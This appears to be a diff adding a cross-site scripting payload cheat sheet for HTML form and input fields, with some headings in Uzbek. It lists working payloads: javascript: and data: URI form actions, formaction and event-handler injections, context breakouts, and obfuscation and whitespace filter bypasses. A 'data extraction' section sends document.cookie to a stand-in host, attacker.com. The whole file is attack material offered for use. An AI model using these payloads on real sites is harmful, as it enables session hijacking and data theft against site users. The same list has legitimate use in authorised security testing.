@@ -1,0 +1,96 @@
+🔥 ULTIMATE FORM / INPUT XSS (CLEAN)
+
+⸻
+
+1. CORE (ENG MUHIM)
+
+<form action=javascript:alert(1)><input type=submit>
+<form action="javascript:alert(document.domain)"><button>Click</button></form>
+
+
+⸻
+
+2. FORMACTION (Juda kuchli)
+
+<form><button formaction=javascript:alert(1)>CLICK</button></form>
+<input type="submit" formaction=javascript:alert(1)>
+
+
+⸻
+
+3. DATA URI (MUHIM)
+
+<form action="data:text/html,<script>alert(1)</script>">
+<form><button formaction="data:text/html,<script>alert(1)</script>">CLICK</button>
+
+
+⸻
+
+4. CONTEXT BREAKOUT
+
+"><form action=javascript:alert(1)>
+'></form><form action=javascript:alert(1)>
+
+
+⸻
+
+5. INPUT EVENT (REAL ATTACK)
+
+<input onfocus=alert(1)>
+<input onmouseover=alert(1)>
+<input onclick=alert(1)>
+
+
+⸻
+
+6. DATA EXTRACTION
+
+<form action=javascript:fetch('//attacker.com?c='+document.cookie)>
+<input onfocus=fetch('//attacker.com?c='+document.cookie)>
+
+
+⸻
+
+7. OBFUSCATION
+
+<form action=jAvAsCrIpT:alert(1)>
+<form action=javascript&colon;alert(1)>
+<form action=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)>
+
+
+⸻
+
+8. WHITESPACE BYPASS
+
+<form action="jav	ascript:alert(1)">
+<form action=" javascript:alert(1)">
+
+
+⸻
+
+9. POLYGLOT
+
+</title><form action=javascript:alert(1)>
+
+
+⸻
+
+10. ENCODED
+
+%3Cform%20action%3Djavascript%3Aalert(1)%3E
+
+
+⸻
+
+11. ADVANCED JS EXECUTION
+
+<form action=javascript:eval('alert(1)')>
+<form action=javascript:setTimeout(alert,0,1)>
+
+
+⸻
+
+12. HYBRID (CHAIN)
+
+<input value="<img src=x onerror=alert(1)>">
+<textarea><svg onload=alert(1)></textarea>
